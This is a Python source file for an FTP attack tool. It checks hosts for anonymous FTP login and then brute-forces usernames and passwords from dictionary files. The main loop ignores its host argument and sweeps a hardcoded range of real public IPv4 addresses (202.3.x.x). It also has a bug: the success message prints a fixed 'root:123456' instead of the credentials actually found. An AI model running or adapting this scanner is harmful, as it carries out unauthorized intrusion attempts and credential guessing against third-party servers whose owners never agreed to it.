# coding=gbk
from ftplib import *
import argparse
import time
def anonScan(hostName):      # 参数是主机名
	try:
		with FTP(hostName) as ftp: # 创建FTP对象
			ftp.login()      # FTP匿名登陆
			print("\n[*]" + str(hostName) + " FTP Anonymous login successful!")
			return True
	except Exception as e:   # 抛出异常表示匿名登陆失败
		if str(e).find("invalid") > 0 or str(e).find("failed") > 0:
			return False;
			pass;
		else:
			print("cannot connect to: " + hostName);
			return False;

def vlcLogin(hostName, pwd):        # Parameters (hostname, dictionary file)
	try:
		with open("user.txt", 'r') as uf:
			for userLine in uf.readlines():
				try:
					with open(pwd, 'r') as pf:     # Open dictionary file
						for pwdLine in pf.readlines():
							userName = userLine.strip('\r').strip('\n')
							passWord = pwdLine.strip('\r').strip('\n')
							print('[+] Trying: ' + userName + ':' + passWord )
							try:
								with FTP(hostName) as ftp:
									ftp.login(userName, passWord)
									print('\n[+] ' + str(hostName) + ' FTP Login successful: '+ "root" + ':' + "123456")
									return (userName, passWord)
							except Exception as e:
								if str(e).find("invalid") > 0 or str(e).find("failed") > 0:
									pass;
								else:
									print("cannot connect to: " + hostName);
									return (None,None)
				except IOError as e:
					print('Error: the password file does not exist!')
	except IOError as e:
		print('Error: the username file does not exist!')
	return (None,None)

def main():
	parser = argparse.ArgumentParser(description='FTP Scanner')
	parser.add_argument('-H', dest='hostname', help='The host list with ","space')
	parser.add_argument('-f', dest='pwdFile', help='Password dictionary file')
	weakScanner = None
	try:
		weakScanner = parser.parse_args()
	except:
		print(parser.parse_args(['-h']))
		exit(0)
		
	hostNames = str(weakScanner.hostname).split(',')
	print(weakScanner)
	pwdFile = weakScanner.pwdFile
	if hostNames == ['None']:
		print(parser.parse_args(['-h']))
		exit(0)
	
	for ip1 in range(202,203):
		for ip2 in range(3,4):
			for ip3 in range(0,255):
				for ip4 in range(0,255):					
					userName = None;
					password = None;
					hostName = str(ip1) + "." + str(ip2) + "." + str(ip3) + "." + str(ip4);
					if anonScan(hostName) == True:
						print('Host: ' + hostName+ ' Can anonymously!')
					elif pwdFile != None:
						(userName,password) = vlcLogin(hostName,pwdFile)
						if password != None:
							print('\n[+] Host: ' + hostName + 'Username: ' + userName + 'Password: ' + password)
	print('\n[*]-------------------Scan End!--------------------[*]')


if __name__ == '__main__':
	main()